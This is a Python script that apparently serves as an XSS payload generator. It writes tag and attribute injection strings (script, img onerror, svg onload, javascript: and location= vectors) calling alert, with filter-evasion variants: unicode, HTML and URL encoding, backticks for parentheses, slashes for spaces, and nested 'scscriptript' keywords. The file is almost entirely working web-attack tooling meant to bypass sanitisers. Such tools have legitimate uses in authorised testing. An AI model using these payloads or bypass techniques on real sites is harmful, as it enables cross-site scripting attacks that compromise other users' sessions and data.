# -*- coding: UTF-8 -*-
from urllib.parse import quote
class make_payload():
	
	def __init__(self):

		self.tag_file = "tag_payload.txt"
		self.attribute_file = "attr_payload.txt"
		self.payload="alert(668868)"
		self.protocal = "javascript:"

	def js_encode(self,sentence):
		payload = ""
		for char_ in sentence:
			payload += "\\u00" + hex(ord(char_))[2:]
		return payload

	def html_encode(self,sentence):
		payload = ""
		for char_ in sentence:
			payload += "&#x" + hex(ord(char_))[2:]
		return payload


	def url_encode(self,sentence):
		payload = ""
		for char_ in sentence:
			payload += "%" + hex(ord(char_))[2:]
		return payload

	def make_tag(self):

		payload_arr = ["<script>*;</script>","<img src=\"1\" onerror=*>","<svg onload=*>","<iframe src=\"http://baidu.com\" onload=*></iframe>","<details open ontoggle=\"*\">","<select autofocus onfocus=*>"
						,"<marquee onstart=*>","<audio src onloadstart=*","<video src=\"_\" onloadstart=\"*\">","<video><source onerror=\"javascript:*\">","<keygen autofocus onfocus=*>"]
		with open(self.tag_file,"w") as f:
			for i in payload_arr:
				tem_payload=self.js_encode(self.payload[:5])# js加密函数名
				f.write(i.replace("*",self.payload)+"\n")
				f.write(i.replace("*",self.payload).replace(" ","/")+"\n")# 空格--> /
				f.write(i.replace("*",self.payload).replace("(","`").replace(")","`")+"\n") #() ---> ``
				#unicode 加密
				f.write(i.replace("*",tem_payload+"(668868)").replace(" ","/")+"\n")
				f.write(i.replace("*",tem_payload+"(668868)")+"\n")
				f.write((i.replace("*",tem_payload+"(668868)").replace("(","`").replace(")","`").replace(" ","/"))+"\n")
				f.write((i.replace("*",tem_payload+"(668868)").replace("(","`").replace(")","`"))+"\n")
				#重叠
				f.write(i.replace("script","scscriptript").replace("*",self.payload)+"\n")
				f.write(i.replace("script","scscriptript").replace("*",self.payload).replace(" ","/")+"\n")# 空格--> /
				f.write(i.replace("*",self.payload).replace("script","scscriptript").replace("(","`").replace(")","`")+"\n") #() ---> ``
				f.write(i.replace("script","scscriptript").replace("*",tem_payload+"(668868)").replace(" ","/")+"\n")
				f.write(i.replace("script","scscriptript").replace("*",tem_payload+"(668868)")+"\n")
				f.write((i.replace("script","scscriptript").replace("*",tem_payload+"(668868)").replace("(","`").replace(")","`").replace(" ","/"))+"\n")
				f.write((i.replace("script","scscriptript").replace("*",tem_payload+"(668868)").replace("(","`").replace(")","`"))+"\n")

	def make_attribute(self):

		with open(self.attribute_file,"w") as f:
			#on事件
			f.write(self.payload+"\n")
			f.write(self.html_encode(self.payload)+"\n")
			f.write(self.html_encode(self.payload).replace("(","`").replace(")","`")+"\n")
			f.write(self.js_encode(self.payload[:5])+"(668868)"+"\n")
			f.write((self.js_encode(self.payload[:5])+"(668868)").replace("(","`").replace(")","`")+"\n")
			f.write(self.html_encode(self.protocal + self.js_encode(self.payload[:5])+"(668868)")+"\n")
			f.write(self.html_encode(self.protocal + self.js_encode(self.payload[:5])+"(668868)").replace("(","`").replace(")","`" + "\n"))
			# 添加location属性，可以进行url编码
			f.write("=location=\"{}{}\">\n".format(self.protocal,self.js_encode(self.payload[:5])+"(668868)"))
			f.write("=location=\"{}{}\">\n".format(self.protocal,self.js_encode(self.payload[:5])+"`668868`"))
			f.write("=location=\"{}{}\">\n".format(self.protocal,self.url_encode(self.payload)))
			f.write("=location=\"{}{}\">\n".format(self.html_encode(self.protocal),self.js_encode(self.payload[:5])+"(668868)"))
			f.write("=location=\"{}{}\">\n".format(self.html_encode(self.protocal),self.js_encode(self.payload[:5])+"`668868`"))
			f.write("=location=\"{}{}\">\n".format(self.html_encode(self.protocal),self.payload))
			f.write("=location=\"{}{}\">\n".format(self.html_encode(self.protocal),self.html_encode(self.js_encode(self.payload[:5])+"(668868)")))
			f.write("=location=\"{}{}\">\n".format(self.html_encode(self.protocal),self.html_encode(self.js_encode(self.payload[:5])+"`668868`")))
			f.write("=location=\"{}{}\">\n".format(self.html_encode(self.protocal),self.html_encode(self.url_encode(self.payload))))

			#src等属性
			f.write("\" onerror=location=\"{}{}\">\n".format(self.protocal,self.js_encode(self.payload[:5])+"(668868)"))
			f.write("\" onerror=location=\"{}{}\">\n".format(self.protocal,self.js_encode(self.payload[:5])+"`668868`"))
			f.write("\" onerror=location=\"{}{}\">\n".format(self.protocal,self.url_encode(self.payload)))
			f.write("\" onerror=location=\"{}{}\">\n".format(self.html_encode(self.protocal),self.js_encode(self.payload[:5])+"(668868)"))
			f.write("\" onerror=location=\"{}{}\">\n".format(self.html_encode(self.protocal),self.js_encode(self.payload[:5])+"`668868`"))
			f.write("\" onerror=location=\"{}{}\">\n".format(self.html_encode(self.protocal),self.url_encode(self.payload)))
			f.write("\" onerror=location=\"{}{}\">\n".format(self.html_encode(self.protocal),self.html_encode(self.js_encode(self.payload[:5])+"(668868)")))
			f.write("\" onerror=location=\"{}{}\">\n".format(self.html_encode(self.protocal),self.html_encode(self.js_encode(self.payload[:5])+"`668868`")))
			f.write("\" onerror=location=\"{}{}\">\n".format(self.html_encode(self.protocal),self.html_encode(self.url_encode(self.payload))))

			f.write("{}{}\n".format(self.protocal,self.js_encode(self.payload[:5])+"(668868)"  + ">"))
			f.write("{}{}\n".format(self.protocal,self.js_encode(self.payload[:5])+"`668868`" + ">"))
			f.write("{}{}\n".format(self.protocal,self.url_encode(self.payload)))
			f.write("{}{}\n".format(self.html_encode(self.protocal),self.js_encode(self.payload[:5])+"(668868)" + ">"))
			f.write("{}{}\n".format(self.html_encode(self.protocal),self.js_encode(self.payload[:5])+"`668868`" + ">"))
			f.write("{}{}\n".format(self.html_encode(self.protocal),self.url_encode(self.payload) + ">"))
			f.write("{}{}\n".format(self.html_encode(self.protocal),self.html_encode(self.js_encode(self.payload[:5])+"(668868)" + ">")))
			f.write("{}{}\n".format(self.html_encode(self.protocal),self.html_encode(self.js_encode(self.payload[:5])+"`668868`" + ">")))
			f.write("{}{}\n".format(self.html_encode(self.protocal),self.html_encode(self.url_encode(self.payload + ">"))))


if __name__ == '__main__':
	a = make_payload()
	#a.make_tag()
	a.make_attribute()